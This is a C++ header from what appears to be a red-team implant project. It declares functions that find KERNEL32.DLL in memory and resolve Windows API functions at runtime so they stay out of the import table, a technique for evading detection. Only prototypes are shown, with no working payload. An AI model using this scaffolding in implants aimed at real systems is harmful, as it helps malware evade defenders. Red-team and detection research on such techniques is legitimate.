#pragma once
#include "RTO Implant.h"


// The blog below was a huge help and allowed me to piece together 
// the rest of what I was missing. Thank you
// https://blog.christophetd.fr/hiding-windows-api-imports-with-a-customer-loader/


// Find our module base in this case just "KERNEL32.DLL"
// We only need exports GetProcAddress and GetModuleHandleA in this case.
PUCHAR FindModuleBase(PCHAR moduleName);
PVOID FindModuleExport(PUCHAR moduleBase, PCHAR functionName);

//Prototypes for our dynamically resolved functions
using GetProcAddressPrototype = FARPROC(WINAPI*)(HMODULE, LPCSTR);
using GetModuleHandleAPrototype = HMODULE(WINAPI*)(LPCSTR);

// Decode our Module and Module Exports
VOID InitResolve();
// Resolves API's for the other files that need additionaly win / nt api's
PVOID ResolveAPI(LPCSTR module, LPCSTR functionName);